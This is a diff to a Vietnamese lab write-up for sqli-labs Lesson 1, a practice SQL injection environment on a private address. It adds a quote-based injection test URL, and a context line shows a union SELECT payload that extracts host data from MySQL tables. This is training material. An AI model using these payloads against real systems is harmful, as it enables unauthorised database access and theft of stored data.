@@ -1,6 +1,15 @@
 # Một số việc làm với được lesson-1.md
 
+![](../images/lesson1/screenshot.png)
+
+Ta sẽ xem là server sử dụng hệ quản trị cơ sở dữ liệu nào ta nhìn vào port và thấy sử dụng MYSQL 
+
 1. Đăng nhập với giá trị id 
+```
+http://192.168.80.225/sqli-labs/Less-1/?id=1'
+```
+
+![](../images/lesson1/screenshot_13.png)
 
 2. Show tấ cả các DB có trong hệ thống
 - Với command
@@ -89,4 +98,4 @@ http://192.168.80.225/sqli-labs/Less-1/?id=1'  union SELECT 1,2,group_concat(Hos
 
 ![](../images/lesson1/screen_12.png)
 
-Tương tự như thế thì đối với các bảng và các DB khác thì ta truy suất tương tự như thế và thay tên các trường các table các DB mà ta mong muốn.
+Tương tự như thế thì đối với các bảng và các DB khác thì ta truy suất tương tự như thế và thay tên các trường các table các DB mà ta mong muốn. 
